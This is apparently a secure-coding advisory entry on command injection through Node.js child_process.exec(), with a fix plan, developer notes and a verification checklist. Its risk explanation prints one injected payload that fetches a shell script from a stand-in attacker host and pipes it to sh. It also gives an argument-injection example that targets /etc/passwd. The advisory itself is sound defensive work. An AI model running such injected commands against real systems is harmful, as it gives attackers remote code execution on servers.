title: Command Injection via child_process
summary: User-controlled input flows into child_process.exec() as part of a shell command string. Because exec() spawns a shell, an attacker can inject shell metacharacters (;, |, &&, $(), backticks) to execute arbitrary commands on the server with the privileges of the Node.js process.
why_it_matters: Command injection is among the most critical vulnerability classes — successful exploitation gives an attacker full control of the server process. With a single crafted input like `; curl attacker.com/shell.sh | sh`, an attacker can install backdoors, exfiltrate secrets and environment variables, pivot to internal networks, or destroy data. Node.js applications are especially prone because child_process.exec() invokes /bin/sh by default, making every shell metacharacter a potential injection vector. Automated scanners and penetration testing tools routinely test for this class of vulnerability.
how_to_fix:
Replace exec() with execFile() or spawn() using explicit argument arrays. These functions bypass the shell entirely, so metacharacters are treated as literal strings.

1. Replace every child_process.exec(cmd) call with child_process.execFile(binary, argsArray).
2. Never construct command strings by concatenating user input — pass each argument as a separate array element.
3. Validate user input against a strict allowlist of expected values before use.
4. If shell features (pipes, redirects, globbing) are genuinely needed, set the specific values yourself — never let user input flow into the shell string.
5. Consider whether the functionality can be reimplemented in JavaScript without shelling out (e.g., use fs/path modules instead of calling shell commands).
6. If you must use exec(), set the shell option to false and pass arguments as an array via spawn().
developer_notes: child_process.exec() always spawns a shell (/bin/sh on Unix, cmd.exe on Windows). child_process.execFile() does NOT spawn a shell — it invokes the binary directly with the argument array, so shell metacharacters have no special meaning. child_process.spawn() also avoids the shell by default, but accepts a { shell: true } option that re-enables it — never set shell: true with user input. Note that even with execFile(), argument injection is still possible if the target binary interprets arguments unsafely (e.g., passing --output=/etc/passwd to curl), so always validate inputs.
verification_checklist: All child_process calls use execFile() or spawn() instead of exec()
Arguments are passed as an explicit array, never concatenated into a string
User input is validated against an allowlist before being passed as arguments
The shell option is not set to true on spawn() or execFile() calls
Error output is not leaked directly to the user response

references.title: CWE-78: Improper Neutralization of Special Elements used in an OS Command
OWASP OS Command Injection Defense Cheat Sheet
